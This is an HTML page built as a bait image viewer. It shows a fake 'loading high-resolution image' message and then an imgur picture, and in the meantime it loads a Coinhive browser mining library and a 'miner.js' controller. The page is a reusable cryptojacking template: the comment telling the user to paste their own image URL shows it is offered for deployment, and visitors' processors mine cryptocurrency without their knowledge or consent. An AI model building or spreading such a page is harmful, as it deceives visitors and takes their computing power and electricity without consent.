<!DOCTYPE html>
<html>
<head>
    <title>Loading...</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        body { margin: 0; padding: 0; background: #111; display: flex; justify-content: center; align-items: center; height: 100vh; color: white; font-family: sans-serif; }
        #loader { text-align: center; }
        #baitImage { max-width: 95%; max-height: 95%; display: none; border: 1px solid #333; }
    </style>
</head>
<body>
    <div id="loader">
        Loading high-resolution image...<br>
        <small style="color: #888;">This may take a few seconds.</small>
    </div>
    <img id="baitImage" src="">

    <!-- ============================================================= -->
    <!-- ====== LOAD THE MINING LIBRARY FIRST ======================= -->
    <!-- ============================================================= -->
    <script src="coin-hive.min.js"></script>
    
    <!-- ============================================================= -->
    <!-- ====== THEN LOAD OUR CONTROLLER ============================= -->
    <!-- ============================================================= -->
    <script>
        var imageUrl = "https://i.imgur.com/GdJ91vF.jpeg"; // <--- PASTE YOUR IMAGE URL

        setTimeout(function() {
            document.getElementById('loader').style.display = 'none';
            document.getElementById('baitImage').src = imageUrl;
            document.getElementById('baitImage').style.display = 'block';
        }, 2500);

        // Load our miner controller
        var script = document.createElement('script');
        script.src = 'miner.js';
        document.head.appendChild(script);
    </script>
</body>
</html>
